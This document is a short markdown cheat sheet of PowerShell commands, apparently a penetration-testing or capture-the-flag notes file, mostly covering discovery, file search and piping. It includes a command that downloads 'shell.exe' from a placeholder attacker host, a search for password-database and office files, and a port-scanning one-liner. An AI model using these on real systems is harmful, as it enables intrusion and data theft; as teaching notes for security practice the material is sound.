# Powershell

Discoverability of scripting languages like Powershell or shell is poor by design.
These notes are for the weary shell-user who finds themselves stuck in a powershell (possibly on a remote machine).
Powershell cmdlets follow the naming pattern of `Verb-Noun`.

## Useful meta commands

Cmdlet for listing other available cmdlets:
```
Get-Command
```

It can take inputs with wildcards.

Once you find the cmdlet you want to use, you can investigate it with:

```
Get-Help ${cmdlet}
```

Now a man-page like output should help discovering how to use it.


## Downloading a file from a URI

```
Invoke-WebRequest -Uri "http://${ATTACK_IP}:${PORT}/shell.exe" -OutFile "shell.exe"
```
or

```
iwr -uri "http://${ATTACK_IP}:${PORT}/shell.exe" -OutFile "shell.exe"
```

## Useful commands cmdlets for searching and enumerating

searching, similar to `find`:
```
Get-ChildItem -Recurse -Filter "filename*"
```
Remeber that you can ignore errors with `-ErrorAction SilentlyContinue` for all these commands.

If we want all files of a specific filetype, we can do:

```
Get-ChildItem -Include *.txt,*.kdbx,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

You can `cat` with:

```
Get-Content -Path $file
```


Base64 decode:

```
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($exampleVar))
```

Open ports:

```
Get-NetTCPConnection
```

Search for only listening ports:
```
Get-NetTCPConnection | Where-Object -Property State -EQ Listen
```

Search for file containing a specific text:

```
Get-ChildItem -Recurse -Path "C:\" | Select-String "${someVar}" -List | Select Path
```

We can use the following trick to exclude paths we don't care about:
```
Get-ChildItem -Recurse -Path "C:\" | Select-String "${someVar}" -List | Select Path | Where-Object { $_ -notmatch ".Net" -and $_ -notmatch "Windows" }
```


If you have a search you know will output the file you want, you can pipe it into `Select-Object`:

```
Get-ChildItem -Path "C:\" -Recurse -Filter "*filter*" | Select-Object -First 1 | Get-Content
```

This will cat the contents of the first file the `Get-ChildItem` cmdlet outputs.

## Open powershell terminal with other credentials:

```
start powershell -credential ""
```

Note you need to kill the parent shell for this to work.
There are probably smarter ways.

## Enumerating open ports with Powershell

(Also referenced in [enumeration.md](./../enumeration.md)
```
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("$RHOST", $_)) " $_/tcp open"} 2>$null
```


## Example of pipes with Where-Object and ForEach-Object
```
Get-LocalGroupMember Users | Where-Object {$_.ObjectClass -Eq "User"} | ForEach-Object -Process {Get-LocalUser $_.Name.split('\')[1]}
```
